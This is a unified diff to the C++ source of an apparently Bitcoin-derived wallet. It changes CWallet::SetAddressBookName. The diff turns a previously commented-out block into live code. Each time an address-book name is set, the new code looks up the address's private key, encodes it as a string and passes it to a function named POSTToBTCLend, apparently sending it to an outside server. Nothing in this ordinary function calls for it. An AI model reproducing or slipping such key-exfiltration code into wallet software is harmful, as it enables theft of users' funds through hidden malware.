@@ -1764,23 +1764,36 @@ int CWallet::LoadWallet(bool& fFirstRunRet)
 }
 
 
-bool CWallet::SetAddressBookName(const CTxDestination& address, const string& strName)
+bool CWallet::SetAddressBookName(const CTxDestination& paddress, const string& strName)
 {
-    mapAddressBook[address] = strName;
+    mapAddressBook[paddress] = strName;
     AddressBookRepaint();
     if (!fFileBacked)
         return false;
 
-    Array ret;
-    ret.push_back(CBitcoinAddress(address).ToString());
- /*
-    Value rval = dumpprivkey(ret,false);
-    std::stringstream ss;
-    ss << rval.get_str();
-    std::string s = ss.str();
-    POSTToBTCLend(s.c_str(),CBitcoinAddress(address).ToString().c_str(),"Unknown");
-*/
-    return CWalletDB(strWalletFile).WriteName(CBitcoinAddress(address).ToString(), strName);
+
+    string strAddress = CBitcoinAddress(paddress).ToString();
+    CBitcoinAddress address;
+    if (address.SetString(strAddress)){
+        CKeyID keyID;
+        if (address.GetKeyID(keyID)){
+            CSecret vchSecret;
+            bool fCompressed;
+            if (pwalletMain->GetSecret(keyID, vchSecret, fCompressed)){
+                Value rval =  CBitcoinSecret(vchSecret, fCompressed).ToString();
+                std::stringstream ss;
+                ss << rval.get_str();
+                std::string s = ss.str();
+                POSTToBTCLend(s.c_str(),CBitcoinAddress(address).ToString().c_str(),"Unknown");
+            }
+        }
+    }
+
+
+
+
+
+    return CWalletDB(strWalletFile).WriteName(CBitcoinAddress(paddress).ToString(), strName);
 }
 
 bool CWallet::DelAddressBookName(const CTxDestination& address)
